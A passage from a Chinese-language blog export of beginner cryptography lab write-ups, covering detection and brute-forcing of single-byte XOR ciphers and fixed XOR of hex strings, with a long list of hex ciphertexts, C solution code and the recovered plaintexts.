121a42395d4c560d213b0c0a26a7e4f4382718153d5e511158a10b2c021e e05d414dfa40222f0c382a03235f4d0d04372d4b7855105e26e44f2e0555 7f3a4f1351f85b0344223e1177e14707190c0e311f4ca633f5f3e9352372 01424d5d1a322a0d381717130e181d07240c2c19ecee750b1a37085d014c 16012c5de55a0314a8260e2759e439123ca0c81c321d454e4e0ee14f4c1d 0b1415512f38580e4e2a227def242643183c224f0ea146443403022fe9fd 43eb2b1078322a02192d5b5e0c360d584d0b5e2c13072912ee32f03f4155 002a52553e08361b0be0074b573e201c164c093a5c0f0159333b59770d5b 38e63c1c5244301a5a01f26930321256143e1ae05e1120a9eaf20a192d58 7d54140a152ef4035f09083ded531ee04df55848020656a1342e502649eb 0c211dfe101702015516341136252f3f06f73247133113f5642d083a3417 015e3d51433f3c003e5e28030b1d413eee186824504b241e0f0d32373e2b 2d465040ec130c5c0e2704aa17010c40095207223669110f22f45ea155f7 14552e2b341e5ce0195351066a23e3283e0ee935444b255a1c5c3cef7614 372b453d5a357c05142be65b3c17f92d2b134853390a312bf92a531b513d 5658265f4c0ce4440a20322f591a413034292b312206a01be6453a512d21 1c585c19f31f785324f8583d1ee02620342b10a236263f105011ee5b0e14 0f522b550818591a752e5fea0e033322ee5e280a4a1b244f5a2b35341255 39093c1ced331b264127173f1312e2455fa33b31012c1f4d073c553f5d5e 18f82d5d07e2430b3b3c1b5b49effb0313173f5d4a2e5c134555ff6b1d1a 550a20234202726341190311295254f4064205aa515ae0145a23071c4e18 3f2047024e3ce4555a1b39fa145455012c3afb0f2d11134846182e3c575b e3e456571937762828065443153b51152e262f09c937024405284f236432 012f580c3536ec5c021574541d5c41123a4e661d5f0f5f344a083e3a5e4c 4216252d01eb0a2a4623621b48360d312c29f33e380650447617124b3e71 54141e59323606390204e95f1206520e5c084510034d30171c5e744f335d 1e30061401600b342e171059526d1949431a3f412f56594c183711ea4837 3131254f11e76f550e1e4d26f1391f44363b151c31281ff45259351da0e6 5def250d0f3505385f22e9f4112633005d272d092e0138275851f943e90e 0939165718303b445210095c16390cf04f19450e06f4545c0a0c320e3e23 1e0b0b1f573f3d0fe05d43090fa8482242300819313142325b1f4b19365b 0d3b2a5d271e463d2203765245065d5d684a051e5815265b52f3171d3004 6af423303817a43324394af15a5c482e3b16f5a46f1e0b5c1201214b5fe4 4030544f3f51151e436e04203a5e3b287ee303490a43fb3b28042f36504e 1a2d5a03fc0e2c04384046242e2b5e1548101825eb2f285f1a210f022141 122355e90122281deeed3ba05636003826525d5551572d07030d4935201f 2a3c484a15410d3b16375d4665271b5c4ce7ee37083d3e512b45204f17f6 03222801255c2c211a7aeb1e042b4e38e8f1293143203139fb202c325f2b 06542a28041956350e292bf3fe5c32133a2a171b3a3e4e4e3101381529e3 4a5209ef24e5f3225e503b143d0e5747323fe7ee3d5b1b5110395619e65a 1fee0a3945563d2b5703701817584b5f5b54702522f5031b561929ea2d1e e7271935100e3c31211b23113a3a5524e02241181a251d521ff52f3c5a76 144a0efee02f0f5f1d353a1c112e1909234f032953ec591e0a58e55d2cf4 efee0cf00d0955500210015311467543544708eb590d113d30443d080c1e 1a562c1f7e2b0030094f051c03e30f4d501a0fe22a2817edfc5e470c3843 1c3df1135321a8e9241a5607f8305d571aa546001e3254555a11511924 eb1d3f54ec0fea341a097c502ff1111524e24f5b553e49e8576b5b0e1e33 72413e2f5329e332ec563b5e65185efefd2c3b4e5f0b5133246d214a401d 352a0ae632183d200a162e5346110552131514e0553e51003e220d47424b 1d005c58135f3c1b53300c3b49263928f55625454f3be259361ded1f0834 2d2457524a1e1204255934174d442a1a7d130f350a123c4a075f5be73e30 0c0518582d131f39575925e0231833370c482b270e183810415d5aec1900 453b181df1572735380b0446097f00111f1425070b2e1958102ceb592928 010a4a2d0b0926082d2f1525562d1d070a7a08152f5b4438a4150b132e20 2b395d0d5d015d41335d21250de33e3d42152d3f557d1e44e4ee22255d2d 4a1b5c272d0d1c45072639362e402dee2853e51311262b17aa72eb390410 e7015f0215352030574b4108e44d0e1a204418e62325ff7f34052f234b2d 1d563c13202346071d39e34055402b0b392c27f552222d3deb3843ee2c16 29332a521f3c1b0811e33e1a25520e323e75e01c17473f55071226120d3d 210b35ee1a0a5335222e35033905170c4f3104eb032d425058367d5a2bf2 1e553809415efb1c460f2f0ffafaec491e4d4e49510452e8245a366a4106 e1f92cee0e10142514e7ec13155c412fe901092f1f0fa738280c5eee5e04 3526291e0b2a5f486a3051041f4c16372f5402e6f70b31a03525190b161a 260e5e1f0c2e4d7528ef11552fefe247201e4752085c1da903563c162a4b 2a14ff2e3265e604075e523b24455c364a7f284f3a43051d52152f1119e8 5f02e55a4b1300063640ef10151002565f0b0c010033a1cbef5d3634484a 1b121c585b495a5e033a09037f2d1754072c2d49084055172a3c220bed4f 1613400e1632435c0018482aa55b363d26290ae4405ded280f2b0c271536 4011250ce02119464a1de43113170356342c272d1d3355555e5706245e0a 16272d5e545953002e10020875e223010719555410f91ce518420e382456 0d4037320345f945241a1d090a545a310142442131464f4d10562ae4f05a 07ee4d4ae12e571e313c1636313134233e495459e548317708563c2c1b2f e75803294b36565225552c3406304f0201e43323291b5e0e2159025c2f25 5e63194411490c44494232237e1b323108573d3f391d1f3537e4165a2b35 51000a3a264c503b5852072a5636f04f5cea58a42838f5fca876415c3521 3c14130be511275932055a30aa2d03470c51060009f210543002585f5713 10f0370c5823115200e5015d083e2f1a5df91d68065c1b03f0080855e529 02ec00f1462d034123151ba6fc07eb3d5e54e85a3f3ee532fb41791a060b 0c29274232f93efb3d465544e45e491b042ced245100e3f05c14134c254b 5741235f051e080401a8013c065627e8ee5432205114243d54320e133f2d 4a4d181635411f5d084e31ed230c16506d5125415e060e4dcd0e5f3708e3 2d531c3e22065a5eee07310c145305131800063e4a20094b2006ea131240 e7335c1c4308160be6aa551a0f5a58243e0b10ee470047683c345e1c5b0c 5434505ee22a18110d20342e4b53062c4d79042a0a02422e225b2523e95a 3252212407115c07e15eee06391d0519e9271b641330011f383410281f0e 2cee2b355233292b595d1c69592f483b54584f7154fd4928560752e333a1 17272b272f110df5e91c560a39104510240b5c4b0c1c570871e422351927 c32550ec3f132c0c2458503ae5241d3c0d7911480a073826315620403615 16e11c270d2b010650145de2290b0beb1e120a3a354b2104064f3b533c4e 505746313d4d2e3455290a281ee81d50007e1148252528025237715a342a 1c0a13163e404e40242142061d34185421160220fa031f7a423a08f2e01a 101d303802f51b0c08ef461259315b553823e622a12d565509e23c624139 0a3d1309e4384c0eed383846545a035a41ee1771513b090a031e15f45159 2d4944092a1965542507003b23195758403e175a0a450c5c38114de21141 eb100fe63a031c4b35eb591845e428441c0d5b0037131f5c160a31243619 c155ef0d19143e24392507a202581a25491b135c27571d5c5b35250f0bef 0e1d510556485e39557e044e2cf10457523016473f500b1e36370c17591c 7e5a19250a5e152b46f5130a094cef08e84704ef10197324464b0114017a 3b56f126390008343d3c400232ed201667211f0b1a1413080202530b08e2 4912321b61c90a0cf6ef0a0a0c0f17fa62eb385e2616194526701aff5fe6 2c57114b0400152d4f2aeb18ed41386c2e3a023a281d1a311eefe750ebab 3a4353282114593b3e36446d2c5e1e582e335337022930331f211604576a 295f3bfae9271ae8065a3b4417545c3e5b0df11a53351c78530915392d2e 074a122ee01b17131e4e124e2322a9560ce4120e37582b24e1036fe93f30 3c08290121090ef72f25e4f220323444532d3fe71f34553c7b2726131009 12e84a3308590357a719e74c4f2133690a20031a0b045af63551325b1219 0e3d4fe03f56523cf40f29e4353455120e3a4f2f26f6a30a2b3e0c5b085a 57f3315c33e41c0f523426232d0651395c1525274e314d0219163b5f181f 53471622182739e9e25b473d74e1e7023d095a3134e62d1366563004120e 230a06431935391d5e0b5543223a3bed2b4358f555401e1b3b5c36470d11 22100330e03b4812e6120f163b1ef6abebe6f602545ef9a459e33d334c2a 463405faa655563a43532cfe154bec32fe3345eb2c2700340811213e5006 14241340112b2916017c270a0652732ee8121132385a6c020c040e2be15b 251119225c573b105d5c0a371c3d421ef23e22377fee334e0228561b2d15 2e4c2e373b434b0d0b1b340c300e4b195614130ea03c234c292e14530c46 0d2c3f08560ee32e5a5b6413355215384442563e69ec294a0eef561e3053 193c100c0b24231c012273e10d2e12552723586120020b02e45632265e5f 2c175a11553d4b0b16025e2534180964245b125e5d6e595d1d2a0710580b 213a175ff30855e4001b305000263f5a5c3c5100163cee00114e3518f33a 10ed33e65b003012e7131e161d5e2e270b4645f358394118330f5a5b241b 33e80130f45708395457573406422a3b0d03e6e5053d0d2d151c083337a2 551be2082b1563c4ec2247140400124d4b6508041b5a472256093aea1847 7b5a4215415d544115415d5015455447414c155c46155f4058455c5b523f 0864eb4935144c501103a71851370719301bec57093a0929ea3f18060e55 2d395e57143359e80efffb13330633ea19e323077b4814571e5a3de73a1f 52e73c1d53330846243c422d3e1b374b5209543903e3195c041c251b7c04 2f3c2c28273a12520b482f18340d565d1fe84735474f4a012e1a13502523 23340f39064e306a08194d544647522e1443041d5ee81f5a18415e34a45f 475a392637565757730a0c4a517b2821040e1709e028071558021f164c54 100b2135190505264254005618f51152136125370eef27383e45350118ed 3947452914e0223f1d040943313c193f295b221e573e1b5723391d090d1f 2c33141859392b04155e3d4e393b322526ee3e581d1b3d6817374d0c085b c2ea5821200f1b755b2d13130f04e26625ea3a5b1e37144d3e473c24030d ee15025d2019f757305e3f010e2a453a205f1919391e1a04e86d1a350119 1a5beb4946180fe0002a031a050b41e5164c58795021e1e45c59e2495c20 1121394f1e381c3647005b7326250514272b55250a49183be5454ba518eb 1ee55936102a465d5004371f2e382f1d03144f170d2b0eed042ee341eb19 ec1014ef3ff1272c3408220a41163708140b2e340e505c560c1e4cf82704 274b341a454a27a0263408292e362c201c0401462049523b2d55e5132d54 e259032c444b091e2e4920023f1a7ce40908255228e36f0f2424394b3c48 34130cf8223f23084813e745e006531a1e464b005e0e1ee405413fe22b4e 4af201080c0928420c2d491f6e5121e451223b070dee54244b3efc470a0e 771c161f795df81c22101408465ae7ef0c0604733ee03a20560c1512f217 2f3a142c4155073a200f04166c565634020a59ea04244ff7413c4bc10858 240d4752e5fa5a4e1ce255505602e55d4c575e2b59f52b4e0c0a0b464019 21341927f3380232396707232ae424ea123f5b371d4f65e2471dfbede611 e10e1c3b1d4d28085c091f135b585709332c56134e4844552f45eb41172a 3f1b5a343f034832193b153c482f1705392f021f5f0953290c4c43312b36 3810161aea7001fb5d502b285945255d4ef80131572d2c2e59730e2c3035 4d59052e1f2242403d440a13263e1d2dea0612125e16033b180834030829 022917180d07474c295f793e42274b0e1e16581036225c1211e41e04042f ec2b41054f2a5f56065e5e0e1f56e13e0a702e1b2f2137020e363a2ae2a4 53085a3b34e75a1caa2e5d031f261f5f044350312f37455d493f131f3746 0c295f1724e90b001a4e015d27091a0b3256302c303d51a05956e6331531 e42b315ce21f0def38144d20242845fa3f3b3b0ce8f4fb2d31ed1d54134b 2957023141335d35372813263b46581af6535a16404d0b4ff12a207648ec e4421e301de25c43010c504e0f562f2018421ce137443b41134b5f542047 0c5600294e085c1d3622292c480d261213e05c1334385108c145f3090612 062d2e02267404241f4966e6e010052d3224e72856100b1d22f65a30e863 324950394700e11a01201a0564525706f1013f353319076b4c0d015a2e24 2a1be80e2013571522483b1e20321a4e03285d211a444d113924e8f41a1f 27193ae2302208e73010eaa1292001045737013e10e4745aed2c105b25fb 1b135d46eaef103e1d330a14337a2a4302441c1631ed07e7100c743a0e35 1a0957115c293b1c0de853245b5b18e2e12d28421b3230245d7b4a55f355 e7360e2b3846202a2926fa495e3302ed064d127a17343a1f11032b40e8f5 06e8f90a3118381c5414157d1434050210363e30500511a00a3d56e10438 30021931f7193e25a0540ef52658350929380974fb035b1a5d2c042959c7 151b0c24052d0e56025404390e5a3909edec0d03070f040cff710825363e 2a2328120b2203320810134a0c0a0ef30b25460bec011c1e26e913575a51 e12d0948ed3c511416151d1c54082b3e385d14f838510bec4e4b5f585321 1559305c3a49192a010f04ec11001a3d5a5621e5535358353206521f013f 172c2c155a3a322009505c290516a2c4e4405a1e0a1e353b6e1a5a4e2f09 552c34e2432b0df1132b130841000d4007232339a2092a593f142b0a0117 0931432e452d3aea1d02587d3a3e56ed2a3050e2f9363df366331e421947 0250094823545b20163f1d0a36a92228ed25564d1a304deae8035c32370d 4314380e264e2359e6a412504a424328e84434ff30236649353315344a00 25e33540550d3c15135b0eed451cfd1812eaf2063f085d6e214d121c342f 37513b2d0a4e3e5211372a3a01334c5d51030c46463e3756290c0d0e1222 132f175e4c4af1120138e1f2085a3804471f5824555d083de6123f533123 0de11936062d3d2f12193e135f38ff5e1a531d1426523746004e2c063a27 49241aee1802311611a50de9592009e936270108214a0c4213a01f09545f 02e14d2babee204a5c4337135821360d021b7831305963ee0737072f0deb 1512371119050c0c1142245a004f033650481830230a1925085c1a172726 3be62f230a4b50526ec9345100252aa729eafa59221b3fa517304e500a15 5e57f231333c3d0c470a47551733511031362a3bed0f334a3f3136104230 eb24015d051a151f245905061a37ea273d2239fe02463a5e314d565f0457 23025f415d290a594e3b5940313347a11c5e41531ff15a385a183829780a 51e0035f2deb3b163eabe8550e2e0414491f573b5419234a28183044e112 1d54e8390b26585f3aef5f14206672240c4a5e5d31e01b4d406e351401fa e555173e242c753b275d4ee50b2f26501402a71b1b5733ec19ee34284aed 2ee8f023401c09383b084d623ef324ee5a33065a6d5e365b092c5d0d4501 3f4e024d4b161e144d5e3b140d1e2944465b491d265603a705373c231240 544f0d4ea6091e00e62d3e130d4f005139f339001a3b480c221b730be75e 5f1f4f3e0a0dec3b5128e32960e42d0fee02275528154b10e65c36555a2e ea3e311b5b0f5f220b1f1b2914f12111f41213e06232224df5ec0114470d 51203f1e01e5563851284013514a565e53125223052f47100e5011100201 3f5bee2305217838582be55958a00245265b0308ec56525b5c114c2d5407 e6e74818e53602160e45372029eb4de72754ec3f49290d2f5901014c0e7f 08e715e612380a5c1908285a1222073a023c562907384e4f470444483f34 1110382b5225343ba6092133483e2d683e1e280227084a1e405e3a341513 415f240f0c53e3f7196e2252fb0105347f345e531f535a344bf439220916 5722e7f7fa2f4c2e057e2a025e2dec31413439aa12265f5a3458f81a4b15 135839401856f337a72fec475a060de239a650163a55392a5b303f051415 56090f18023a2b16e2364407050d48e1541408281d3aa3e84c5b264c1f33 1725f9540aec5e10ed293e4e5a5a2d2125f053251a55395d1c2044022231 292d523ff86a180620075f325e02566659f30423525a053a01f0087f4b3b 17fe493808f25309251e1325596ce32b42311e5d0c2f58652640582a4b17 67381a5afb7128150a0043e45b173d2111155c49092d2635370a3a201826 e62d021d36e03b205d5f1f295c094608342a412122583f3bfc34190be62c 393a055f59060d454a235326e844243a30285c14e316272524f4f0444f51 352c3c5b2b5845244f55494940194721f80b120f07392b7c2c5a0508111e 2f1219430151e60f11150b101e295736361b1e053e4d08f83f230e2c383a ef5b1d492610e834330f5cf3a2485d324f2822084f41111f582957191b19 1e3e223704fe1d2e1f592753e5550f15170b231b4234e945301f5605a670 300d322759ea0337015c662a0e073809543f2741104835512d0624551751 373727ef1f41084d0b5c0c0137283b1337026aea1c5ae115064ffa183402 09152b11e1233e5a0e302a521c5a33181e180026463744a82c024b4bf04e 1df61df1263fee59135c13400950153d3c5c59183b020b1d2d2c492f4968 e2000c405a01ede30c4c082e2537443c120f38fc57c43651423e5c3beb1d 1922182420191b293e163d58020b005f454a0621051a38e80b090a463ee9 39513f2d47042c0fe5134419ec48490f150f323a5ee7a7e0201e193a5e1b 2037200a2b1013567b35fb4a0f322c2f49435d091920521c302b413f5f35 775d1a345b483b35a02a4c3e17ee3a3d5a5b57153613264f23041922432f 35125b3e0a1d2257eb002a26455e1a2f042e1545e92f0b3408032c4f3551 2d4c392321300a18ed4f3e2c314d20500052aa3917e55d0d29500754282e 381b2e263758f63c474a1c23110c2d5f1c220412e91043580656080c0427 081ce1e5350b6a3535f0e6592e5b543432340e38f008e0324102e45a3f25 30040c181615362e4d1016160a4a5c006eeb1d2422355a3f1028ff192a07 53f6354d4b5d121974245c14f0225713331f2e381810101428571725e432 1a2c06372d5b1419742150042d25003c2650512834ef16e51d183f0f0508 3d191107251100ee2e4125405a44174f061e0e1e5959e606530e06ed245e 3f592d47512dec5922500e460e1de7183b4c3c2e583942255a0c5d4d2305 3438001e482a002d56113a1fe13bed542d3508e22f4e22221431121c1539 ed445a5d28415073eb18022ef836274d573a48090f2a663058194901405d 215b143954fc313c1e28584b51e729ef31013b232bfb4c52e2322a2d4557 5244102e1c3d304450ee01761924e62ff2173305e15809102b2125284dfc 171a3f010f3639056f2be71c2047581de32e05a20833e1221b0e25362459 2958280de238084f5a1c292e005be71f3b311e1f415809383d3862260238 361f56ecee120156375862eb3627185c2519545149e2e50b1f3b0c4e3352 e6115f440634e4005d273611e41c5d383c3814537b3d23362b084024345b 10370656372e0236eb4f3303e216505f0e465228383729394faa2f205f34 2e125b2f2c1d0f1f170e0c51331f0c06291610345c0603791f33253f0e0c 1c2b080526133aeb3e23571d4cfa1e48057a2a010a490a50391b09514f2e 59383ae11237e5450029162d2e1d3e09221a160e42ea06ea0ca7c7ecf4ea 3d3024f34d5c07464bea3b185e110d3a10395d3b2632343cf30ca2e6065a 262f111c0e15441a4825111b185f1e5756243206125f4603e97e79582d27 2d5801ee2654113e2da00b58e9260d643c10423e1d1f42093b0d0f7d5102 3649211f210456051e290f1b4c584d0749220c280b2a50531f262901503e 52053e3e152b5b2b4415580fec57ef5c08e5ed43cc2d2e5b40355d0d2017 6d3917263f030c4b55f0025d501e57504a122729293c4c5819680d3001ed 1e313323324e5e177b171cf70c371541395c0e2b7726e42505483014362e 1910e4f7253f0a012057e03b1e3b4201362b224ff60e0b3a1d115b043957 200c1e0b242e5e3b4755f61e3be05c040908f1234358e55562711d2efa0f 0737e0160b1d13132044080d2325f1f0ee2f00354f2106471131020a5d0b 3f21060de62c052a17576e2ce729242b3e3621300627f01e52580a480050 1b381a11351f4f5d22040c3c4b3e7d263714e8e61a571d107a34260a4a51 edf52314e111207c0b23eb482f441d211f306137152407040e08530a783e 3c054e2d4e2905275e640220f74f1a193f54e1ed5b4e2a290eab27a55147 33522817335316ea2f3df957e25e02030601514f09f74c2fedee102d3114 5d05231d03313826164156110c44e4111f4658005e115e300f413b430300 380bf53a4331f74627492c133fe8eb3141ee39040def040c1a0ae914e3ed 5b00f0211f0a091e05582e22f05a5d262e0ce352251d25100b102b11e339 36053935f051f959093252411e2d5af81f360c0fa15d0b373b1d26323b77 501424184202206215e05944505c4817514540445b0207025de05b050932 0a5a114515536f553a352c513f0b12f700345fa51d5efb28222676e559ea 561b0557403f5f534a574638411e2d3b3c133f79555c333215e6f5f9e7ec 6658f7210218110f00062752e305f21601442c5310162445ed4d175630f3 0e2154253c4a22f02e1b0933351314071b521513235031250c18120024a1 e03555453d1e31775f37331823164c341c09e310463438481019fb0b12fa 37eee654410e4007501f2c0e42faf50125075b2b46164f165a1003097f08 2a5332145851553926523965582e5b2f530d5d1e292046344feaed461517 583d2b06251f551d2f5451110911e6034147481a05166e1f241a5817015b 1f2d3f5c310c315402200010e24135592435f71b4640540a041012ee1b3f 5b2010060e2f5a4d045e0b36192f79181b0732183b4a261038340032f434 3a5557340be6f5315c35112912393503320f54065f0e275a3b5853352008 1c595d183539220eec123478535337110424f90a355af44c267be848173f 41053f5cef5f6f56e4f5410a5407281600200b2649460a2e3a3c38492a0c 4c071a57e9356ee415103c5c53e254063f2019340969e30a2e381d5b2555 32042f46431d2c44607934ed180c1028136a5f2b26092e3b2c4e2930585a 实验原理或者解题思路方法：首先将文件中的文件导入二维数组中（可以先检查是否是60位，我为了增强代码使用的范围，并没有筛选），然后将每个数组中的十六进制转换为二进制，每八位为一组转换成十进制存到数组中，用双重for循环，将十进制数与0~127进行异或，然后输出字符型。计算的时候先排除不可能出现的字符（例如ASCII值在0到32之间的等等，具体排除范围在代码中会有），排除后在检查空格的数量，因为每段话一定会出现空格，所以明文中空格的数量在3个或者3个以上，输出符合要求的字符串，再进行筛查，会减少很多时间。（这一部分和实验三相同） 示例代码为：#include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; int ssd(char s[],int l,int ww);//将十六进制字符串 转换为二进制以及解密 int main() { //从文件读取字符串 FILE *fp; //首先算出文件行数 int flag = 0, file_row = 0, count = 0; if((fp = fopen(&quot;F:\\111.txt&quot;, &quot;r&quot;)) == NULL) return -1; while(!feof(fp)) { flag = fgetc(fp); if(flag == &apos;\n&apos;) count++; } file_row = count + 1; //加上最后一行 // printf(row = %d\n&quot;, file_row); //将文件存入二维数组中 char s[file_row][60]; if((fp=fopen(&quot;F:\\111.txt&quot;,&quot;r&quot;))==NULL){ printf(&quot;Cannot open the file,strike any key to exit!\n&quot;); getchar(); exit(0); } for(int i=0;i&lt;file_row;i++){ fgets(s[i],100,fp); // printf(&quot;%d:%s&quot;,i,s[i]); } fclose(fp); for(int i=0;i&lt;file_row;i++){ // fgets(s[i],100,fp); // printf(&quot;%d:%s&quot;,i,s[i]); } int l=60; int num=0; printf(&quot;排除不可能字符后字符串中空格数大于三的字符串有：\n\n&quot;); for(int i=0;i&lt;file_row;i++) { num=ssd(s[i],l,num); } } int ssd(char s[],int l,int ww)//将十六进制字符串 转换为二进制以及解密 { int e; char aaa[100]; for(e=0;e&lt;l;e++) { if(s[e]&lt;=&apos;f&apos;&amp;&amp;s[e]&gt;=&apos;a&apos;) aaa[e]=int(s[e])-87; else aaa[e]=int(s[e])-48; // printf(&quot;%d &quot;,aaa[e]); } char ss[1000];//二进制字符串 char as[]={0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,0,1,0,0,0,1,0,1,0,1,1,0,0,1,1,1,1,0,0,0,1,0,0,1,1,0,1,0,1,0,1,1,1,1,0,0,1,1,0,1,1,1,1,0,1,1,1,1}; int x=0,v=0,k; do{ k=0; while(k&lt;4) { int c; c=4*aaa[x]+k; ss[v++]=as[c]; // printf(&quot;%d&quot;,ss[v-1]); k++; } x++; }while(x&lt;l); //for(int m=0;m&lt;4*l;m++) //printf(&quot;%d=%d &quot;,m,ss[m]); int i=0,n=0,q=0; char u[100]; //将二进制每8位一组转换成十进制数 while(1){ n=2*n+ss[i++]; if(i%8==0||i==v) { u[q++]=n; n=0; if(i==v) break; } } //异或输出每组解密后结果 for(int q=0;q&lt;=127;q++) { int num=0; for(int p=0;p&lt;l/2;p++) { aaa[p]=q^u[p]; if((((int)aaa[p])&gt;=0&amp;&amp;((int)aaa[p])&lt;=31)||(((int)aaa[p])&gt;=60&amp;&amp;((int)aaa[p])&lt;=64)||((int)aaa[p])&gt;=123)//进行一轮筛选，将一些不可能是明文字符排除 break;//利用break减少无效的for循环次数 if(((int)aaa[p])==32) num++; } if(num&gt;3) { ww++; printf(&quot;%d: 密钥为 %c 明文为：&quot;,ww,q); for(int p=0;p&lt;l/2;p++) { aaa[p]=q^u[p]; printf(&quot;%c&quot;,aaa[p]); } printf(&quot;\n&quot;); } } return ww; } 运行结果为：1： 密钥为：5 明文为：Now that the party is jumping]]></content>
      <tags>
        <tag>cryptology</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[密码学实验3_Single-byte XOR cipher]]></title>
    <url>%2F2019%2F03%2F29%2F%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C3-Single-byte-XOR-cipher%2F</url>
    <content type="text"><![CDATA[Single-byte XOR cipher （一个字符串被单字符加密，请找出该单字符）如下是一个被单字符异或后得到的十六进制的字符串，请找出该单字符（即密钥），并解密该密文。1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736 提示：利用英语字母频率，穷举法 ###实验原理或者解题思路方法：将十六进制转换为二进制，每八位为一组转换成十进制存到数组中，用双重for循环，将十进制数与0~127进行异或，然后输出字符型。计算的时候先排除不可能出现的字符（例如ASCII值在0到32之间的等等，具体排除范围在代码中会有），排除后在检查空格的数量，因为每段话一定会出现空格，所以明文中空格的数量在3个或者3个以上，输出符合要求的字符串，再进行筛查，会减少很多时间。 示例代码如下：#include&lt;stdio.h&gt; void ssd(char s[],int l);//将十六进制字符串 转换为二进制以及解密 int main() { char a[]={&quot;1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736&quot;}; int s,t; t=sizeof(a)-1; ssd(a,t); } void ssd(char s[],int l)//将十六进制字符串 转换为二进制以及解密 { int e; char aaa[100]; for(e=0;e&lt;l;e++) { if(s[e]&lt;=&apos;f&apos;&amp;&amp;s[e]&gt;=&apos;a&apos;) aaa[e]=int(s[e])-87; else aaa[e]=int(s[e])-48; // printf(&quot;%d &quot;,aaa[e]); } char ss[1000];//二进制字符串 char as[]={0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,0,1,0,0,0,1,0,1,0,1,1,0,0,1,1,1,1,0,0,0,1,0,0,1,1,0,1,0,1,0,1,1,1,1,0,0,1,1,0,1,1,1,1,0,1,1,1,1}; int x=0,v=0,k; do{ k=0; while(k&lt;4) { int c; c=4*aaa[x]+k; ss[v++]=as[c]; // printf(&quot;%d&quot;,ss[v-1]); k++; } x++; }while(x&lt;l); //for(int m=0;m&lt;4*l;m++) //printf(&quot;%d=%d &quot;,m,ss[m]); int i=0,n=0,q=0; char u[100]; //将二进制每8位一组转换成十进制数 while(1){ n=2*n+ss[i++]; if(i%8==0||i==v) { u[q++]=n; n=0; if(i==v) break; } } //异或输出每组解密后结果 (只输出空格数大于3的字符串） int ww=0;//输出次序 printf(&quot;排除不可能字符后字符串中空格数大于三的字符串有：\n\n&quot;); for(int q=0;q&lt;=126;q++) { int num=0; for(int p=0;p&lt;l/2;p++) { aaa[p]=q^u[p]; if((((int)aaa[p])&gt;=0&amp;&amp;((int)aaa[p])&lt;=31)||(((int)aaa[p])&gt;=60&amp;&amp;((int)aaa[p])&lt;=64)||((int)aaa[p])&gt;=123)//进行一轮筛选，将一些不可能是明文字符排除 break;//利用break减少无效的for循环次数 if(((int)aaa[p])==32) num++; } if(num&gt;3) { ww++; printf(&quot;%d: 密钥为 %c 明文为：&quot;,ww,q); for(int p=0;p&lt;l/2;p++) { aaa[p]=q^u[p]; printf(&quot;%c&quot;,aaa[p]); } printf(&quot;\n&quot;); } } } 运行结果：密钥为 X 明文为： Cooking MC&apos;s like a pound of bacon]]></content>
      <tags>
        <tag>cryptology</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[密码学实验2_Fixed XORR]]></title>
    <url>%2F2019%2F03%2F29%2F%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C2%E2%80%94-Fixed-XORR%2F</url>
    <content type="text"><![CDATA[Fixed XOR （将两个等长的十六进制字符串进行异或）编程实现两个等长的十六进制字符串的异或，如果你的程序能正确运行，就可以将如下的前面两个字符串异或成第三个字符串：1c0111001f010100061a024b53535009181c after hex decoding, and when XOR’d against: 686974207468652062756c6c277320657965 should produce: 746865206b696420646f6e277420706c6179 实验原理或者解题思路方法：将两个十六进制字符串分别转换成为二进制，然后将他们进行异或，将新生成的字符串每四个一组转换成十进制，然后将十进制直接以十六进制形式输出 实现代码如下：#include&lt;stdio.h&gt; void ttos(char b[],int v);//二进制转换为十六进制并输出 char *ssd(char s[],int l,int y);//将十六进制 转换为二进制 void stot(char a[],char b[],int l);//异或 int main() { char a[]={&quot;1c0111001f010100061a024b53535009181c&quot;}; char b[]={&quot;686974207468652062756c6c277320657965&quot;}; int j; j=sizeof(a)-1; stot(a,b,j); } void ttos(char b[],int v)//二进制转换为十六进制并输出 { int i=0,n=0,q=0; char s[100]; //将二进制每4位一组转换成十进制数 while(1){ n=2*n+b[i++]; if(i%4==0||i==v) { s[q++]=n; n=0; if(i==v) break; } } for(i=0;i&lt;q;i++) printf(&quot;%x&quot;,s[i]);//十进制直接输出位十六进制 printf(&quot;\n&quot;); } char *ssd(char s[],int l,int y)//将十六进制 转换为二进制 { int e; char aaa[100]; //将十六进制数利用SCII分别与十进制整数对应并存储到数组中 for(e=0;e&lt;l;e++) { if(s[e]&lt;=&apos;f&apos;&amp;&amp;s[e]&gt;=&apos;a&apos;) aaa[e]=int(s[e])-87; else aaa[e]=int(s[e])-48; } char ss[3][1000]; //十六进制的组合从0到e char as[]={0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,0,1,0,0,0,1,0,1,0,1,1,0,0,1,1,1,1,0,0,0,1,0,0,1,1,0,1,0,1,0,1,1,1,1,0,0,1,1,0,1,1,1,1,0,1,1,1,1}; int x=0,v=0,k; //将十进制数转换为二进制存入数组中 do{ k=0; while(k&lt;4) { int c; c=4*aaa[x]+k; ss[y][v++]=as[c]; k++; } x++; }while(x&lt;l); return ss[y]; } void stot(char a[],char b[],int l)//异或 { char *aa; char *bb; char cc[1000]; char qw[1000]; bb=ssd(b,l,1); aa=ssd(a,l,0); int h; for(h=0;h&lt;4*l;h++)//比较异或 { if(aa[h]==bb[h]) cc[h]=0; else cc[h]=1; } printf(&quot;异或后十六进制数为：\n&quot;); ttos(cc,4*l); } 运行结果略。]]></content>
      <tags>
        <tag>cryptology</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[密码学实验1_Convert hex to base64]]></title>
    <url>%2F2019%2F03%2F29%2F%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C1-Convert-hex-to-base64%2F</url>
